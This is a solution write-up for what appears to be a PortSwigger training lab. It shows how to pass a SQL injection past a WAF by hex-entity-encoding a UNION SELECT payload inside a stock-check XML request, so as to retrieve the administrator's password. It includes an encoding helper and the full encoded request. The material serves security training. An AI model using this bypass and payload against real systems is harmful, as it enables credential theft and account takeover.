# SQL injection with filter bypass via XML encoding

**Lab Url**: [https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)

## Objective

This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The database contains a `users` table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account.

## Solution

The stock check feature sends data in XML format. A WAF blocks plain SQL keywords, but we can bypass it by encoding the payload as XML hex entities.

### Step 1: Encode the SQL payload

Convert the SQL query into hex entity format. Each character is replaced by `&#xNN;` where `NN` is its hexadecimal code point:

```python
def to_hex_entities(text):
    return ''.join(f'&#x{ord(c):X};' for c in text)

print(to_hex_entities("UNION SELECT password FROM users WHERE username='administrator';"))
```

This converts the payload into something like:

```xml
&#x55;&#x4E;&#x49;&#x4F;&#x4E;...
```

### Step 2: Inject the encoded payload

Place the hex-encoded payload inside the `storeId` element of the stock check XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>
        1 &#x55;&#x4E;&#x49;&#x4F;&#x4E; &#x53;&#x45;&#x4C;&#x45;&#x43;&#x54; &#x70;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64; &#x46;&#x52;&#x4F;&#x4D; &#x75;&#x73;&#x65;&#x72;&#x73; &#x57;&#x48;&#x45;&#x52;&#x45; &#x75;&#x73;&#x65;&#x72;&#x6E;&#x61;&#x6D;&#x65;&#x3D;&#x27;&#x61;&#x64;&#x6D;&#x69;&#x6E;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#x6F;&#x72;&#x27;&#x3B;
    </storeId>
</stockCheck>
```

The XML parser decodes the entities before the SQL query reaches the database, bypassing the WAF.

### Step 3: Login

The response reveals the administrator's password. Log in as `administrator` to solve the lab.
